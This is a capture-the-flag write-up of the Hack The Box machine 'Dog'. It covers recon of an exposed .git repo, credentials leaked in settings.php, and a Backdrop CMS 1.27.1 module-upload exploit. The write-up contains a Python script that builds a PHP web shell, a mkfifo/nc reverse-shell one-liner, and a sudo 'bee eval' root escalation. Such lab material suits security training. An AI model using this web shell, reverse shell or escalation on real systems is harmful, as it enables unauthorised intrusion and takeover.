# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22   | ssh     |
| 80   | http    |

We get this from the scan:

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEJsqBRTZaxqvLcuvWuqOclXU1uxwUJv98W1TfLTgTYqIBzWAqQR7Y6fXBOUS6FQ9xctARWGM3w3AeDw+MW0j+iH83gc9J4mTFTBP8bXMgRqS2MtoeNgKWozPoy6wQjuRSUammW772o8rsU2lFPq3fJCoPgiC7dR4qmrWvgp5TV8GuExl7WugH6/cTGrjoqezALwRlKsDgmAl6TkAaWbCC1rQ244m58ymadXaAx5I5NuvCxbVtw32/eEuyqu+bnW8V2SdTTtLCNOe1Tq0XJz3mG9rw8oFH+Mqr142h81jKzyPO/YrbqZi2GvOGF+PNxMg+4kWLQ559we+7mLIT7ms0esal5O6GqIVPax0K21+GblcyRBCCNkawzQCObo5rdvtELh0CPRkBkbOPo4CfXwd/DxMnijXzhR/lCLlb2bqYUMDxkfeMnmk8HRF+hbVQefbRC/+vWf61o2l0IFEr1IJo3BDtJy5m2IcWCeFX3ufk5Fme8LTzAsk6G9hROXnBZg8=
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM/NEdzq1MMEw7EsZsxWuDa+kSb+OmiGvYnPofRWZOOMhFgsGIWfg8KS4KiEUB2IjTtRovlVVot709BrZnCvU8Y=
|   256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPMpkoATGAIWQVbEl67rFecNZySrzt944Y/hWAyq4dPc
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510
| http-robots.txt: 22 disallowed entries
| /core/ /profiles/ /README.md /web.config /admin
| /comment/reply /filter/tips /node/add /search /user/register
| /user/password /user/login /user/logout /?q=admin /?q=comment/reply
| /?q=filter/tips /?q=node/add /?q=search /?q=user/password
|_/?q=user/register /?q=user/login /?q=user/logout
| http-git:
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
|_http-title: Home | Dog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


# RECONNAISSANCE
---

Let's start, following the scan we can notice that `/robots.txt` is allowed so, let's check it out:

![Pasted image 20250310134947.png](../../IMAGES/Pasted%20image%2020250310134947.png)


If we go to `/?q=admin`, we can check this:

![Pasted image 20250310135422.png](../../IMAGES/Pasted%20image%2020250310135422.png)

As it was clear, we are unable to access admin resources at this point, let's keep looking around.

If we remember the scan correctly, we had a git repository, let's check it out first:


![Pasted image 20250310140430.png](../../IMAGES/Pasted%20image%2020250310140430.png)

Nice, we know we are dealing with a `.git` we can use `GitHack` to rebuild the source code from a `.git` folder while keeping the directory structure unchanged.

[Githack](https://github.com/lijiejie/GitHack)


Now, after we use it, we can see this:


![Pasted image 20250310175211.png](../../IMAGES/Pasted%20image%2020250310175211.png)

We got a `settings.php` file, let's read it:


![Pasted image 20250310175240.png](../../IMAGES/Pasted%20image%2020250310175240.png)

If we try those credentials at the login page, we are unable to log in, it seems like the username is wrong, after looking around for a while I found a file located at:

```
10.10.11.58/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json
```

If we read it:

```json
{
    "_config_name": "update.settings",
    "_config_static": true,
    "update_cron": 1,
    "update_disabled_extensions": 0,
    "update_interval_days": 0,
    "update_url": "",
    "update_not_implemented_url": "https://github.com/backdrop-ops/backdropcms.org/issues/22",
    "update_max_attempts": 2,
    "update_timeout": 30,
    "update_emails": [
        "tiffany@dog.htb"
    ],
    "update_threshold": "all",
    "update_requirement_type": 0,
    "update_status": [],
    "update_projects": []
}
```


Found an username:

```
tiffany:BackDropJ2024DS2024
```

Now, if try these credentials, we get access:

![Pasted image 20250310175641.png](../../IMAGES/Pasted%20image%2020250310175641.png)


Let's start exploitation.


# EXPLOITATION
---

We are dealing with `Backdrop CMS 1.27.1`, we can try searching for an exploit regarding this version:

![Pasted image 20250310175803.png](../../IMAGES/Pasted%20image%2020250310175803.png)


When we use the exploit:


![Pasted image 20250310180447.png](../../IMAGES/Pasted%20image%2020250310180447.png)

Let's go to the URL and upload the crafted payload:

![Pasted image 20250310180517.png](../../IMAGES/Pasted%20image%2020250310180517.png)



![Pasted image 20250310180534.png](../../IMAGES/Pasted%20image%2020250310180534.png)

So, we need to modify the file for it to match `.tar.gz`, in order to automate the process, I modified the python script:

```python
import os
import time
import tarfile

def create_files():
    info_content = """
    type = module
    name = Block
    description = Controls the visual building blocks a page is constructed
    with. Blocks are boxes of content rendered into an area, or region, of a
    web page.
    package = Layouts
    tags[] = Blocks
    tags[] = Site Architecture
    version = BACKDROP_VERSION
    backdrop = 1.x

    configure = admin/structure/block

    ; Added by Backdrop CMS packaging script on 2024-03-07
    project = backdrop
    version = 1.27.1
    timestamp = 1709862662
    """
    shell_info_path = "shell/shell.info"
    os.makedirs(os.path.dirname(shell_info_path), exist_ok=True)
    with open(shell_info_path, "w") as file:
        file.write(info_content)

    shell_content = """
    <html>
    <body>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
    <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
    <input type="SUBMIT" value="Execute">
    </form>
    <pre>
    <?php
    if(isset($_GET['cmd']))
    {
    system($_GET['cmd']);
    }
    ?>
    </pre>
    </body>
    </html>
    """
    shell_php_path = "shell/shell.php"
    with open(shell_php_path, "w") as file:
        file.write(shell_content)
    return shell_info_path, shell_php_path

def create_tar_gz(info_path, php_path):
    tar_filename = "shell.tar.gz"
    with tarfile.open(tar_filename, "w:gz") as tar:
        tar.add(info_path, arcname='shell/shell.info')
        tar.add(php_path, arcname='shell/shell.php')
    return tar_filename

def main(url):
    print("Backdrop CMS 1.27.1 - Remote Command Execution Exploit")
    time.sleep(3)

    print("Evil module generating...")
    time.sleep(2)

    info_path, php_path = create_files()
    tar_filename = create_tar_gz(info_path, php_path)

    print("Evil module generated!", tar_filename)
    time.sleep(2)

    print("Go to " + url + "/admin/modules/install and upload the " +
          tar_filename + " for Manual Installation.")
    time.sleep(2)

    print("Your shell address:", url + "/modules/shell/shell.php")

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python script.py [url]")
    else:
        main(sys.argv[1])
```

Now, let's upload our file and visit this:

```
modules/shell/shell.php
```

![Pasted image 20250310181029.png](../../IMAGES/Pasted%20image%2020250310181029.png)

Let's try to execute a command:

![Pasted image 20250310181304.png](../../IMAGES/Pasted%20image%2020250310181304.png)

There we go, we got RCE, let's send ourselves a reverse shell:

```nc
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc IP PORT >/tmp/f
```

![Pasted image 20250310181823.png](../../IMAGES/Pasted%20image%2020250310181823.png)

Let's begin privesc.

# PRIVILEGE ESCALATION
---


First thing to do is to stable our shell:

```
python -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

Once we are in the machine, we can see which users are in here too:

![Pasted image 20250310182315.png](../../IMAGES/Pasted%20image%2020250310182315.png)

We got another user `johncusack`, we can try switching user using the credentials we found at the beginning:

```
johncusack:BackDropJ2024DS2024
```

```
bash-5.0$ su johncusack
Password:
bash-5.0$ whoami
johncusack
```

And it worked, let's get our first flag:

```
bash-5.0$ cat user.txt
cb29ae50efe5a11a2183ca43018fb7a8
```

Now, let's start our privesc, let's begin by checking our privileges:

```bash
bash-5.0$ sudo -l
[sudo] password for johncusack:
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

We can read that file:

```
#!/usr/bin/env php
<?php
/**
 * @file
 * A command line utility for Backdrop CMS.
 */

// Exit gracefully with a meaningful message if installed within a web
// accessible location and accessed in the browser.
if (!bee_is_cli()) {
  echo bee_browser_load_html();
  die();
}

// Set custom error handler.
set_error_handler('bee_error_handler');

// Include files.
require_once __DIR__ . '/includes/miscellaneous.inc';
require_once __DIR__ . '/includes/command.inc';
require_once __DIR__ . '/includes/render.inc';
require_once __DIR__ . '/includes/filesystem.inc';
require_once __DIR__ . '/includes/input.inc';
require_once __DIR__ . '/includes/globals.inc';

// Main execution code.
bee_initialize_server();
bee_parse_input();
bee_initialize_console();
bee_process_command();
bee_print_messages();
bee_display_output();
exit();

/**
 * Custom error handler for `bee`.
 *
 * @param int $error_level
 *   The level of the error.
 * @param string $message
 *   Error message to output to the user.
 * @param string $filename
 *   The file that the error came from.
 * @param int $line
 *   The line number the error came from.
 * @param array $context
 *   An array of all variables from where the error was triggered.
 *
 * @see https://www.php.net/manual/en/function.set-error-handler.php
 * @see _backdrop_error_handler()
 */
function bee_error_handler($error_level, $message, $filename, $line, array $context = NULL) {
  require_once __DIR__ . '/includes/errors.inc';
  _bee_error_handler_real($error_level, $message, $filename, $line, $context);
}

/**
 * Detects whether the current script is running in a command-line environment.
 */
function bee_is_cli() {
  return (empty($_SERVER['SERVER_SOFTWARE']) && (php_sapi_name() == 'cli' || (is_numeric($_SERVER['argc']) && $_SERVER['argc'] > 0)));
}

/**
 * Return the HTML to display if this page is loaded in the browser.
 *
 * @return string
 *   The concatentated html to display.
 */
function bee_browser_load_html() {
  // Set the title to use in h1 and title elements.
  $title = "Bee Gone!";
  // Place a white block over "#!/usr/bin/env php" as this is output before
  // anything else.
  $browser_output = "<div style='background-color:white;position:absolute;width:15rem;height:3rem;top:0;left:0;z-index:9;'>&nbsp;</div>";
  // Add the bee logo and style appropriately.
  $browser_output .= "<img src='./images/bee.png' align='right' width='150' height='157' style='max-width:100%;margin-top:3rem;'>";
  // Add meaningful text.
  $browser_output .= "<h1 style='font-family:Tahoma;'>$title</h1>";
  $browser_output .= "<p style='font-family:Verdana;'>Bee is a command line tool only and will not work in the browser.</p>";
  // Add the document title using javascript when the window loads.
  $browser_output .= "<script>window.onload = function(){document.title='$title';}</script>";
  // Output the combined string.
  return $browser_output;
}
```

- **Unsanitized Code Execution in `bee eval`**:  
    The `bee eval` command is designed to execute PHP code (e.g., for debugging or CMS tasks). However, it does not restrict code execution, allowing attackers to run arbitrary commands.

In order to exploit this, let's do the following


```
cd /var/www/html
sudo /usr/local/bin/bee eval "system('/bin/bash');"
```

![Pasted image 20250310184558.png](../../IMAGES/Pasted%20image%2020250310184558.png)

We got root access and can finally access our final flag:

```
root@dog:/var/www/html# cat /root/root.txt
169fdb7e5c27085f2f0be6820c107b39
```

Just like that, CTF is done.

![Pasted image 20250310184641.png](../../IMAGES/Pasted%20image%2020250310184641.png)

